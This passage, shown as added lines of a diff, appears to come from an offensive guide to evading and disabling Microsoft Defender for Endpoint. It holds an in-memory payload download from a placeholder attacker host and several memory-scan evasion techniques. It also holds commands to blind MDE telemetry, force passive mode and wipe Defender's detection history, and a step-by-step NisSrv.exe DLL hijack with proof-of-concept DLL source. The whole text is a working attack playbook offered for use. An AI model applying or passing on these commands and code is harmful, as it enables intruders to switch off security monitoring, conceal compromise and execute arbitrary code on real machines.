+# Reflective DLL injection — load a DLL without writing it to disk:
+# The DLL is downloaded as bytes and loaded directly into memory
+# No file is ever written — Defender's on-access scanner has nothing to scan
+
+# PowerShell — download and execute entirely in memory:
+$bytes = (New-Object Net.WebClient).DownloadData('http://attacker/payload.bin')
+# Decrypt/decrypt bytes in memory, then execute via shellcode runner
+
+# Sleep obfuscation — encrypt shellcode during sleep intervals:
+# MDE's periodic memory scans (AMScan) scan live process memory
+# Encrypting shellcode when not executing prevents memory scan detection
+# Implementations: Ekko, Foliage, Cronos sleep obfuscation
+# These XOR/RC4 the shellcode region, then restore before execution
+
+# Heap encryption (Cobalt Strike and custom implants):
+# Encrypt the heap containing beacon config/shellcode during sleep
+# Decrypt only when active — memory scans during sleep find only ciphertext
+
+# Syscall obfuscation — avoid syscall stubs being fingerprinted:
+# Hell's Gate / Halo's Gate — dynamically resolve syscall numbers at runtime
+# Indirect syscalls (call via ntdll gadget) — return address points to ntdll
+# Avoiding direct jmp/call patterns to syscall numbers
+
+# Stack spoofing — fake call stack to appear legitimate during scanning:
+# MDE checks the call stack of suspended threads for suspicious patterns
+# Stack spoofers (e.g., ThreadStackSpoofer, SilentMoonwalk) forge return addresses
+# Makes shellcode thread appear to have been called from a legitimate module
+
+# PE stomping / module stomping:
+# Map a legitimate DLL, overwrite its .text section with shellcode
+# Memory appears to belong to a signed, legitimate DLL path
+# VAD (Virtual Address Descriptor) shows the legitimate backing file
+```
+
+### Microsoft Defender for Endpoint — Sensor Disruption
+
+MDE's telemetry pipeline depends on several components: the WdFilter.sys minifilter, the MsSense.exe sensor process, ETW-TI providers, and cloud connectivity. Disrupting any of these degrades detection capability.
+
+```
+# MDE components and disruption points:
+# WdFilter.sys    — kernel minifilter, blocks protected processes
+# MsSense.exe     — userland sensor (PPL-AM protected)
+# SenseCncProxy   — command and control connectivity to MDE cloud
+# MpCmdRun.exe    — management interface (can be used to check status)
+
+# Check MDE sensor connectivity:
+sc query sense
+# State: RUNNING / STOPPED
+
+# MDE cloud connectivity check — if blocked, cloud detections fail:
+# MDE phones home to *.securitycenter.windows.com / *.atp.azure.com
+# Block these domains at firewall/host — degrades cloud IOC lookups and response
+
+# Disrupt MDE telemetry via ETW provider manipulation:
+# MDE relies heavily on Microsoft-Windows-Threat-Intelligence ETW provider (ETW-TI)
+# Patching EtwThreatIntProvRegHandle in ntoskrnl:
+# 1. Get kernel base via NtQuerySystemInformation
+# 2. Resolve EtwThreatIntProvRegHandle symbol offset
+# 3. Write 0 to that address via BYOVD kernel R/W
+# 4. ETW-TI stops collecting — MDE loses high-fidelity kernel events
+
+# Disable DiagTrack (Connected User Experiences — telemetry to Microsoft):
+sc stop DiagTrack
+sc config DiagTrack start= disabled
+# This disrupts Microsoft's cloud-side analysis but not the on-device sensor
+
+# Registry: disable MDE heartbeat reporting:
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection" /v ForceDefenderPassiveMode /t REG_DWORD /d 1 /f
+# Puts MDE sensor in passive mode — reduces active blocking to detection-only
+```
+
+## Microsoft Defender — Threat Detection History
+
+`Get-MpThreat` and `Get-MpThreatDetection` reveal what Defender has detected on the system. Useful for situational awareness — check what tools or payloads have been caught, identify exact file paths that triggered detection, and understand detection timelines.
+
+```
+# View all detected threats (name, ID, severity):
+Get-MpThreat
+
+# Example output showing detected Cobalt Strike beacon:
+# ThreatName : Backdoor:Win64/CobaltStrike!pz
+# ThreatID   : 2147894794
+# SeverityID : 5 (Severe)
+# IsActive   : False
+# DidThreatExecute : False
+
+# Get detection events for a specific threat ID:
+Get-MpThreatDetection -ThreatID 2147894794
+
+# Key fields in detection output:
+# InitialDetectionTime  — when first detected
+# Resources             — file path that triggered detection
+# ProcessName           — process that had the file open
+# DomainUser            — user context at detection time
+# RemediationTime       — when Defender acted on it
+# CleaningActionID      — 2 = quarantine, 3 = remove, 8 = no action
+
+# Get all detections sorted by time (most recent first):
+Get-MpThreatDetection | Select-Object ThreatID, InitialDetectionTime, Resources, ProcessName | Sort-Object InitialDetectionTime -Descending
+
+# Clear the protection history log (useful for testing — requires admin):
+Remove-Item "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\*" -Recurse -Force
+```
+
+## Windows Defender DLL Hijacking (NisSrv.exe)
+
+Windows Defender's Network Inspection Service (`NisSrv.exe`) loads `mpclient.dll` from its own directory. By copying `NisSrv.exe` to a user-writable directory and placing a crafted `mpclient.dll` alongside it, you can execute arbitrary code under the service's context.
+
+### Attack Steps
+
+```
+# Step 1: Copy NisSrv.exe to a writable location
+copy "%ProgramFiles%\Windows Defender\NisSrv.exe" "C:\Users\Public\DLL Hijacking\"
+
+# Step 2: Compile the malicious mpclient.dll (Linux cross-compile)
+sudo apt-get install gcc-mingw-w64-x86-64 g++-mingw-w64-x86-64 wine64
+x86_64-w64-mingw32-g++ --shared -o mpclient.dll mpclient.cpp
+
+# Step 3: Place mpclient.dll in the same directory as NisSrv.exe
+# Step 4: Run NisSrv.exe — it loads mpclient.dll from the current directory
+
+# Serve the DLL via HTTP if needed
+python3 -m http.server 80
+```
+
+### mpclient.dll Source (PoC)
+
+```
+// mpclient.cpp — exports the functions NisSrv.exe expects
+#include <windows.h>
+#pragma comment(lib, "User32.lib")
+
+int Main() {
+    // Replace with your payload
+    MessageBoxW(0, L"DLL HIJACKING", L"DLL Hijacked", 0);
+    return 1;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        break;
+    }
+    return TRUE;
+}
+
+// Export stubs for expected functions
+extern "C" __declspec(dllexport) void MpConfigClose(){}
+extern "C" __declspec(dllexport) void MpConfigGetValueAlloc(){}
+extern "C" __declspec(dllexport) void MpHandleClose(){}
+extern "C" __declspec(dllexport) void MpNotificationRegister(){}
+extern "C" __declspec(dllexport) void MpManagerOpen(){}
+extern "C" __declspec(dllexport) void MpFreeMemory(){}
+extern "C" __declspec(dllexport) void MpConfigUninitialize(){}
+extern "C" __declspec(dllexport) void MpConfigOpen(){}
+extern "C" __declspec(dllexport) void MpConfigInitialize(){}
+extern "C" __declspec(dllexport) void MpClientUtilExportFunctions(){}
+extern "C" __declspec(dllexport) void MpUtilsExportFunctions(){ Main(); }
+```
+
+## Resources
+
+- Windows Defender DLL Hijacking PoC — `github.com/2XXE-SRA/Windows-Defender-DLL-Hijacking`
+- DLL Hijacking — HackTricks — `book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking`
+- Microsoft Defender Exclusions — `learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/`
